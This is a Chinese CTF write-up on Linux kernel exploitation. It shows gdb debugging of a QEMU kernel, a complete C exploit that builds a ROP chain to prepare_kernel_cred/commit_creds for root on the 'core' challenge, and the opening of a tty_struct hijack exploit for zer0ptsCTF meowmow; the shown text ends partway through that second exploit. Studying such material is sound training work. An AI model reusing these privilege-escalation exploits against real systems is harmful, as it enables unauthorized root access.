href="#4-gdb调试qemu中内核基本方法" class="headerlink" title="4. gdb调试qemu中内核基本方法"></a>4. gdb调试qemu中内核基本方法</h3><p>众所周知,调试在pwn中是十分重要的,特别是动调,所以这里介绍下gdb调试内核的方法<br>由于咱们的内核是跑在qemu中,所以我们gdb需要用到远程调试的方法,但是如果直接连端口的话会出现没符号表不方便调试的,所以我们需要自行导入内核模块,也就是文件提供的<code>vmlinux</code>,之后由于咱们还需要core.ko的符号表,所以咱们也可以通过自行导入来获得可以,通过 <code>add-symbol-file core.ko textaddr</code> 加载 ,而这里的<code>textaddr</code>即为<code>core.ko</code>的<code>.text</code>段地址,我们可以通过修改<code>init</code>中为<code>root</code>权限进行设置.<br>这里.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，<br>这里强烈建议大伙先关kaslr(通过在启动脚本修改,就是将kaslr改为nokaslr)再进行调试,效果图如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/5882b2b7d0a20cf48316b11d33094b36adaf996a.jpg"><br>我们可以通过<code>-gdb tcp:port</code>或者 <code>-s </code>来开启调试端口，<code>start.sh</code> 中已经有了 -s，不必再自己设置。(对了如果-s ,他的功能等同于-gdb tcp:1234)<br>在我们获得.text基地址后记得用脚本来开gdb,不然每次都要输入这么些个东西太麻烦了,脚本如下十分简单:</p><pre><code class="hljs">#!/bin/bashgdb -q \  -ex &quot;&quot; \  -ex &quot;file ./vmlinux&quot; \  -ex &quot;add-symbol-file ./extract/core.ko 0xffffffffc0000000&quot; \  -ex &quot;b core_copy_func&quot; \  -ex &quot;target remote localhost:1234&quot; \</code></pre><p>其中打断点可以先打在core_read,这里打在core_copy_func是我调到尾声修改的.这里还注意一个点,就是当采用pwndbg的时侯需要root权限才可以进行调试不然会出现以下错误</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77094b36acaf2edd1b05062bc81001e938019378.jpg"><br>最开始气死我了,人家peda都不要root,但是最开始不清楚为什么会错,我还以为是版本问题,但想到这是我最近刚配的一台机子又应该不是,其实最开始看到permission就该想到的,害.<br>我们用root权限进行开调</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0824ab18972bd40717299c3f3e899e510eb30901.jpg" alt="aa"><br>可以看到十分的成功,此刻我continue,还记得咱们下的断电码,b core_read,如果咱们调用它后咱们就会在这里停下来,此刻我们运行咱们的程序试试</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b7003af33a87e950aaf6bcae55385343faf2b40b.jpg"><br>这样咱们就可以愉快的进行调试啦,至此gdb调试内核基本方法到此结束~~~</p><h3 id="5-ROP链解析"><a href="#5-ROP链解析" class="headerlink" title="5. ROP链解析"></a>5. ROP链解析</h3><p>这里简单讲讲,直接给图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5b84aa63614da81cb38db3dd2.jpg"><br>相信大家理解起来不费力.</p><h3 id="6-exp"><a href="#6-exp" class="headerlink" title="6. exp"></a>6. exp</h3><p>本次exp如下,大伙看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">// address of to key function</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff81050ac2 </span><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-comment">//int fd = 0;        // file pointer of process &#x27;core&#x27;</span><br><br><span class="hljs-comment">/*void saveStatus();</span><br><span class="hljs-comment">void get_function_address();</span><br><span class="hljs-comment">#void core_read(int fd, char* buf);</span><br><span class="hljs-comment">void change_off(int fd, long long off);</span><br><span class="hljs-comment">void core_copy_func(int fd, long long nbytes);</span><br><span class="hljs-comment">void print_binary(char* buf, int length);</span><br><span class="hljs-comment">void shell();</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *addr)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;try read\n&quot;</span>);<br>  ioctl(fd,<span class="hljs-number">0x6677889B</span>,addr);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read done!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> off)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;try set off \n&quot;</span>);<br>  ioctl(fd,<span class="hljs-number">0x6677889C</span>,off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> nbytes)</span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;try cp\n&quot;</span>);<br>  ioctl(fd,<span class="hljs-number">0x6677889A</span>,nbytes);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_function_address</span><span class="hljs-params">()</span>&#123;<br>        FILE* sym_table = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);        <span class="hljs-comment">// including all address of kernel functions,just like the user model running address.</span><br>        <span class="hljs-keyword">if</span>(sym_table == <span class="hljs-literal">NULL</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-type">size_t</span> addr = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">char</span> func_name[<span class="hljs-number">0x50</span>];<br>        <span class="hljs-comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;<br>                <span class="hljs-keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)                <span class="hljs-comment">// two addresses of key functions are all found, return directly.</span><br>                        <span class="hljs-keyword">return</span>;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(func_name, <span class="hljs-string">&quot;commit_creds&quot;</span>))&#123;                <span class="hljs-comment">// function &quot;commit_creds&quot; found</span><br>                        commit_creds = addr;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(func_name, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))&#123;<br>                        prepare_kernel_cred = addr;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);<br>                &#125;<br>        &#125;<br>&#125;<br><br><br>​<br>​<span class="hljs-type">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span>&#123;<br>​        <span class="hljs-keyword">if</span>(getuid())&#123;<br>​                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;</span>);<br>​                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>​        &#125;<br>​        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Getting the root......\033[0m\n&quot;</span>);<br>​        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>​        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>​&#125;<br>​<br>​<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>​  saveStatus();<br>​  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);              <span class="hljs-comment">//get the process fd</span><br>​  <span class="hljs-keyword">if</span>(!fd)&#123;<br>​                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: Cannot open process \&quot;core\&quot;\n\033[0m&quot;</span>);<br>​                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>​        &#125;<br>​  <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>​        get_function_address();                <span class="hljs-comment">// get addresses of two key function</span><br>​  <span class="hljs-type">ssize_t</span> vmlinux = commit_creds - commit_creds;            <span class="hljs-comment">//base address</span><br>​  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;vmlinux_base = %x&quot;</span>,vmlinux);<br>​  <span class="hljs-comment">//get canary </span><br>​  <span class="hljs-type">size_t</span> canary;<br>​  change_off(fd,<span class="hljs-number">0x40</span>);<br>​  <span class="hljs-comment">//getchar();</span><br>​  <br>​  core_read(fd,buffer);<br>​  canary = ((<span class="hljs-type">size_t</span> *)buffer)[<span class="hljs-number">0</span>];<br>​  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;canary ==&gt; %p\n&quot;</span>,canary);<br>​  <span class="hljs-comment">//build the ROP</span><br>​  <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x1000</span>] ,i= <span class="hljs-number">0</span>;<br>​  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;construct the chain\n&quot;</span>);<br>​  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt; <span class="hljs-number">10</span> ;i++)&#123;<br>​    rop_chain[i] = canary;<br>​  &#125;<br>​  rop_chain[i++] = POP_RDI_RET + vmlinux ; <br>​  rop_chain[i++] = <span class="hljs-number">0</span>;<br>​  rop_chain[i++] = prepare_kernel_cred ;          <span class="hljs-comment">//prepare_kernel_cred(0)</span><br>​  rop_chain[i++] = POP_RDX_RET + vmlinux;<br>​  rop_chain[i++] = POP_RCX_RET + vmlinux;<br>​  rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + vmlinux;<br>​  rop_chain[i++] = commit_creds ;<br>​  rop_chain[i++] = SWAPGS_POPFQ_RET + vmlinux;<br>​  rop_chain[i++] = <span class="hljs-number">0</span>;<br>​  rop_chain[i++] = IRETQ + vmlinux;<br>​  rop_chain[i++] = (<span class="hljs-type">size_t</span>)shell;<br>​  rop_chain[i++] = user_cs;<br>​  rop_chain[i++] = user_rflags;<br>​  rop_chain[i++] = user_sp;<br>​  rop_chain[i++] = user_ss;<br>​  write(fd,rop_chain,<span class="hljs-number">0x800</span>);<br>​  core_copy_func(fd,<span class="hljs-number">0xffffffffffff0100</span>); <br>​&#125;<br><br><br><br></code></pre></td></tr></table></figure><h3 id="7-编译运行"><a href="#7-编译运行" class="headerlink" title="7. 编译运行"></a>7. 编译运行</h3><p>这里哟个小知识,那就是在被攻击的内核中一般不会给你库函数,所以咱们需要用gcc中的-static参数进行静态链接,然后就是为了支持内嵌汇编代码,所以我们需要使用<code>-masm=intel</code>,这里intel也可以换amd,看各位汇编语言用的啥来进行修改.我这里用的把保存状态代码是intel支持的.</p><pre><code class="hljs">gcc test.c -o test -static -masm=intel -g</code></pre><p>将此编译得到的二进制文件打包近文件系统然后重新启动,情况如图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/faf2b2119313b07e6cb81eca49d7912396dd8cef.jpg"></p><h5 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权!!!!!"></a><strong>成功提权!!!!!</strong></h5><h2 id="例题：2020-zer0ptsCTF-meowmow"><a href="#例题：2020-zer0ptsCTF-meowmow" class="headerlink" title="例题：2020-zer0ptsCTF-meowmow"></a>例题：2020-zer0ptsCTF-meowmow</h2><p>题目中一些寻常的结构体都开了，经过调试发现内核并没有开启以下选项</p><p><code>CONFIG_SLAB_FREELIST_RANDOM=n</code><br><code>CONFIG_SLAB_FREELIST_HARDENED=n</code></p><p>而题目当中存在很明显的越界读写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title">mod_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *f_pos)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (filp-&gt;f_pos &lt; <span class="hljs-number">0</span> || filp-&gt;f_pos &gt;= MAX_SIZE) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (count &gt; MAX_SIZE) count = MAX_SIZE - *f_pos;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_to_user</span>(buf, &amp;memo[filp-&gt;f_pos], count)) <span class="hljs-keyword">return</span> -EFAULT;<br>  *f_pos += count;<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title">mod_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *f_pos)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (filp-&gt;f_pos &lt; <span class="hljs-number">0</span> || filp-&gt;f_pos &gt;= MAX_SIZE) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (count &gt; MAX_SIZE) count = MAX_SIZE - *f_pos;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(&amp;memo[filp-&gt;f_pos], buf, count)) <span class="hljs-keyword">return</span> -EFAULT;<br>  *f_pos += count;<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">loff_t</span> <span class="hljs-title">mod_llseek</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">loff_t</span> offset, <span class="hljs-type">int</span> whence)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">loff_t</span> newpos;<br>  <span class="hljs-keyword">switch</span>(whence) &#123;<br>  <span class="hljs-keyword">case</span> SEEK_SET:<br>    newpos = offset;<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> SEEK_CUR:<br>    newpos = filp-&gt;f_pos + offset;<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> SEEK_END:<br>    newpos = <span class="hljs-built_in">strlen</span>(memo) + offset;<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (newpos &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -EINVAL;<br>  filp-&gt;f_pos = newpos;<br>  <span class="hljs-keyword">return</span> newpos;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因此我们可以很轻松的泄露出堆地址，然后也可以知道自己本身分配堆块的地址，因为freelist是按照顺序来的</p><p>而由于该漏洞模块会从 <code>kmalloc-1k</code>开始分配堆块，所以我们尝试使用 <code>tty_struct</code>进行利用，然后泄露出他结构体当中的内核基地址，之后我们正常劫持他的ops字段即可稳定提权</p><p>这里 <code>mov rdi, rax</code>确实不好找，最终是在 <code>convert_to_art_dsc</code>该函数中找到了合适的gadget :^)</p><p>效果如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0b46f21fbe096b6359873a644a338744ebf8ac6c.jpg"></p><p>下面就是本次的exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 0x400 <span class="hljs-comment">//1k,nice</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_SPRAY_NR 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e65900</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81001268</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAVE_RET 0xffffffff81008ae7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RSP_0X28_RET 0xffffffff810db617</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff8107bb50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff8107b8b0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RAX_RET 0xffffffff81022353</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMDOE 0xFFFFFFFF81A00A45</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff81043137</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_RET 0xffffffff81021f38 </span><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bind_cpu</span><span class="hljs-params">(<span 